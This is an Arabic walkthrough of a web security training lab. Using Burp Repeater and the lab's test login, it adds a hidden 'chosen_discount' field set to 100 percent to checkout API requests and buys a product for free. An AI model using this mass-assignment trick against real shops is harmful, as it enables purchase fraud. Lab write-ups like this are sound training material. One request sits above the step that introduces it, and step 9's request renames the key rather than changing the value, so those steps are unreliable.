## الخطوات

1. في متصفح Burp، سجل دخولك للتطبيق باستخدام البيانات دي: `wiener:peter`.
2. اضغط على المنتج Lightweight "l33t" Leather Jacket واضيفه في سلة المشتريات.
3. روح للسلة واضغط "Place order"، هتلاحظ إن رصيدك مش كافي للشراء.
4. في **Proxy > HTTP history**، هتلاحظ طلبات GET و POST لـ `/api/checkout`.

### Request
```http
POST /api/checkout HTTP/2
Host: 0a5c00fd0328d67b828db0e8007f004f.web-security-academy.net

{      
 "chosen_products": [
            {
                "product_id": "1",
                "quantity": 1
            }
        ]
    }
```


5. شوف إن الاستجابة لطلب الـ GET فيها نفس هيكل الـ JSON اللي في طلب الـ POST. والفرق إن استجابة الـ GET فيها باراميتر اسمه `chosen_discount` مش موجود في الـ POST.
6. اضغط يمين على طلب الـ POST لـ `/api/checkout` واختار "Send to Repeater".

### Request
```http
POST /api/checkout HTTP/2
Host: 0a5c00fd0328d67b828db0e8007f004f.web-security-academy.net

    {
        "chosen_discount": {
            "percentage": 0
        },
        "chosen_products": [
            {
                "product_id": "1",
                "quantity": 1
            }
        ]
    }
```
7. في **Repeater**، أضف الباراميتر `chosen_discount` للطلب، وهيبقى الشكل كده:


8. ابعت الطلب، وهتلاحظ إن إضافة `chosen_discount` مفيش منها أي مشكلة.
9. غير قيمة `chosen_discount` لـ "x" وابعت الطلب. هتلاحظ إن في رسالة خطأ لأن القيمة مش رقم.
```http
POST /api/checkout HTTP/2
Host: 0a5c00fd0328d67b828db0e8007f004f.web-security-academy.net

    {
        "x": {
            "percentage": 0
        },
        "chosen_products": [
            {
                "product_id": "1",
                "quantity": 1
            }
        ]
    }
```
10. غير قيمة `chosen_discount` لـ 100، وابعت الطلب علشان تحل اللاب.

```http
POST /api/checkout HTTP/2
Host: 0a5c00fd0328d67b828db0e8007f004f.web-security-academy.net

    {
        "chosen_discount": {
            "percentage": 100
        },
        "chosen_products": [
            {
                "product_id": "1",
                "quantity": 1
            }
        ]
    }
```
